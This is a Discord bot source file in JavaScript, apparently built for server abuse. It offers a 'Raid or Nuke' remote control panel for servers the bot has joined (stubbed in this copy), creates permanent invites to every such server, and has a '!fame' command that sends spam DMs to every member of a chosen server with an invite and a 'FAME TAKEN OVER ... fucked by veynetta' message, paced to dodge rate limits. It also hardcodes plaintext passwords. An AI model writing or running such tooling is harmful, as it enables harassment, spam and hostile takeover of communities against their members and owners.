const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  MessageFlags
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== MESSAGE COMMANDS ======================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;
  const content = message.content.trim().toLowerCase();

  if (content === '!check') {
    // ... your existing !check code ...
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔍 Remote Server Control')
      .setDescription('Select any server → Raid or Nuke')
      .setFooter({ text: 'Only you can use this' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`check_start_${message.author.id}`)
        .setLabel('Start')
        .setStyle(ButtonStyle.Primary)
    );

    return message.reply({ embeds: [embed], components: [row] });
  }

  if (content === '!fame') {
    const embed = new EmbedBuilder()
      .setColor('#ff00ff')
      .setTitle('📨 FAME DM SPAM')
      .setDescription('This will DM spam all members in a chosen server with the invite link.\nPassword required.')
      .setFooter({ text: 'Only you can use this' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`fame_start_${message.author.id}`)
        .setLabel('Start DM Spam')
        .setStyle(ButtonStyle.Danger)
    );

    return message.reply({ embeds: [embed], components: [row] });
  }

  if (content === '!inv') {
    // your existing !inv code
    const guilds = Array.from(client.guilds.cache.values());
    if (guilds.length === 0) return message.reply('❌ Bot is not in any servers.');

    const embed = new EmbedBuilder().setColor('#00ffff').setTitle('📋 Servers & Invites');
    for (const guild of guilds) {
      let inviteLink = 'Failed';
      try {
        const inv = await guild.invites.create(guild.channels.cache.find(c => c.type === 0)?.id, { maxAge: 0 });
        inviteLink = inv.url;
      } catch {}
      embed.addFields({ name: guild.name, value: `Members: ${guild.memberCount}\nInvite: ${inviteLink}` });
    }
    message.reply({ embeds: [embed] });
  }
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userId = parts[parts.length - 1];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
    }

    // ====================== !FAME COMMAND ======================
    if (action === 'fame') {
      if (interaction.isButton() && interaction.customId.startsWith('fame_start_')) {
        const modal = new ModalBuilder()
          .setCustomId(`fame_modal_${interaction.user.id}`)
          .setTitle('Enter Password');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
        ));
        return await interaction.showModal(modal);
      }

      if (interaction.isModalSubmit() && interaction.customId.startsWith('fame_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== MAIN_PASSWORD) {
          return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
        }

        const guilds = Array.from(client.guilds.cache.values());
        if (guilds.length === 0) return interaction.reply({ content: '❌ Bot is in no servers.', flags: MessageFlags.Ephemeral });

        const options = guilds.map(g => ({
          label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
          value: g.id,
          description: `${g.memberCount} members`
        }));

        const select = new StringSelectMenuBuilder()
          .setCustomId(`fame_server_select_${interaction.user.id}`)
          .setPlaceholder('Select server to DM spam')
          .addOptions(options);

        await interaction.reply({
          content: '✅ Password correct. Choose server to mass DM:',
          components: [new ActionRowBuilder().addComponents(select)],
          flags: MessageFlags.Ephemeral
        });
      }

      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fame_server_select_')) {
        await interaction.deferUpdate();
        const guild = client.guilds.cache.get(interaction.values[0]);
        if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

        await interaction.editReply({ content: `📨 Starting DM spam in **${guild.name}**...` });

        const invite = 'https://discord.gg/NANQMy3WnD';
        let sent = 0;
        const delay = ms => new Promise(r => setTimeout(r, ms));

        const members = await guild.members.fetch();

        for (const member of members.values()) {
          if (member.user.bot) continue;
          try {
            await member.send(`**FAME TAKEN OVER**\n${invite}\n**fucked by veynetta**`).catch(() => {});
            sent++;
            await delay(900); // Safe DM rate
          } catch {}
        }

        await interaction.editReply({ 
          content: `✅ **DM SPAM COMPLETE**\nSent to **${sent}** members in **${guild.name}**` 
        });
      }
    }

    // Keep your existing !check logic here (password, nuke, etc.)

  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      interaction.reply({ content: '❌ Something went wrong.', flags: MessageFlags.Ephemeral }).catch(() => {});
    }
  }
});

client.login(TOKEN);
